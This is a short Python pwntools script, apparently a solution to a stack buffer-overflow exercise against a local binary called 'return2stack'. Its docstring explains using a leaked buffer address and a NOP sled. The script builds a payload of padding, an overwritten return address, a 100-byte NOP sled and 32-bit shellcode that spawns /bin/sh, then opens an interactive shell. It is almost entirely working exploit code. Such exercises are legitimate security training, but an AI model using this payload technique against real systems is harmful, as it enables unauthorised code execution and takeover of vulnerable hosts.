"""
This exercise looks into returning to a stack location.
With ASLR included, I made it print the location of the buffer so that it is easier to reference to.
This exercise also look into the importance of a nopsled as the offset might not be accurate so the nopsled helps us to migitate that problem of jumping into the wrong place by giving us a nice wide area to jump to.
"""

from pwn import *

def main():
	io = process('./return2stack')

	io.recvuntil(': ')

	buffer_loc = io.recv().decode()[:-1]
	log.info(f"Buffer location received: {buffer_loc}")
	
	# http://shell-storm.org/shellcode/files/shellcode-811.php
	shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"

	padding = b'A' * 76

	offset = 0x50

	shell_loc = p32(int(buffer_loc, 16) + offset)

	nopsled = b'\x90' * 100

	payload = padding + shell_loc + nopsled + shellcode

	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()